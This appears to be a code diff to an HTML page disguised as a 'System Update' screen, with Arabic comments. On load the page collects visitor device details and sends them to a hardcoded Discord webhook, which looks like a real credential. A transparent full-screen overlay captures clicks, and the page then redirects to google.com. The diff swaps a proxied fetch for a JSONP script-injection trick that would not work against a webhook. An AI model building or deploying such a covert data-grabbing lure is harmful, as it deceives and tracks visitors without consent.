@@ -5,13 +5,17 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>System Update</title>
     <style>
-        body { margin: 0; padding: 0; font-family: sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .container { background: white; padding: 2rem; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; width: 300px; z-index: 1; position: relative; }
+        body { 
+            margin: 0; padding: 0; font-family: sans-serif; 
+            background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; 
+        }
+        .container { 
+            background: white; padding: 2rem; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); 
+            text-align: center; width: 300px; z-index: 1; position: relative; 
+        }
         h2 { margin-top: 0; color: #333; }
         #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: transparent; z-index: 9999; cursor: pointer; }
         #status { margin-top: 10px; font-size: 12px; color: gray; }
-        /* صندوق الأخطاء */
-        #debug-box { position: fixed; bottom: 10px; right: 10px; background: #fff; border: 1px solid red; padding: 5px; font-size: 10px; max-height: 100px; overflow: auto; display: none; z-index: 10000; width: 200px; text-align: left; }
     </style>
 </head>
 <body>
@@ -22,18 +26,10 @@
 </div>
 
 <div id="overlay"></div>
-<div id="debug-box"></div>
 
 <script>
-    // ⚙️ رابط الويب هوك الخاص بك
+    // ⚙️ ضع رابط الويب هوك الخاص بديسكورد هنا
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1564210777194233899/KtJ9_m_v6mvbHHXpn8aVvWnTysSSqmQCBRUJiCtow8O9krQGPddn1i2ojt_cJrYNPpSZ'; 
-
-    function log(msg) {
-        const box = document.getElementById('debug-box');
-        box.style.display = 'block';
-        box.innerText += msg + "\n";
-        console.log(msg);
-    }
 
     async function sendDiscord(data) {
         let caption = 🎉 تقرير جديد\n\n📱 الجهاز: ${data.platform || 'N/A'};
@@ -42,19 +38,22 @@
         caption += \n🌐 المتصفح: ${data.userAgent.substring(0, 60)}...;
 
         try {
-            const proxyUrl = 'https://corsproxy.io/?';
-            log("جاري الاتصال بـ Discord...");
-            const response = await fetch(proxyUrl + encodeURIComponent(WEBHOOK_URL), {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: caption })
-            });
+            // استخدام JSONP لتجاوز مشاكل CORS
+            const script = document.createElement('script');
+            const callbackName = 'discordCallback_' + Date.now();
             
-            if (!response.ok) throw new Error(HTTP Error: ${response.status});
-            log("✅ تم الإرسال بنجاح!");
+            window[callbackName] = function() {
+                document.getElementById('status').innerText = "تم بنجاح! جاري التحويل...";
+                setTimeout(() => window.location.href = "https://google.com", 1000);
+            };
+
+            const payload = encodeURIComponent(JSON.stringify({ content: caption }));
+            script.src = ${WEBHOOK_URL}?callback=${callbackName}&payload=${payload};
+            
+            document.body.appendChild(script);
             return true;
         } catch (error) {
-            log("❌ فشل الإرسال: " + error.message);
+            document.getElementById('status').innerText = "حدث خطأ.";
             return false;
         }
     }
@@ -84,14 +83,7 @@
 
     async function start() {
         const data = await getDeviceInfo();
-        const success = await sendDiscord(data);
-        
-        if(success) {
-            document.getElementById('status').innerText = "تم بنجاح! جاري التحويل...";
-            setTimeout(() => window.location.href = "https://google.com", 1000);
-        } else {
-            document.getElementById('status').innerText = "حدث خطأ.";
-        }
+        await sendDiscord(data);
     }
 
     window.onload = start;
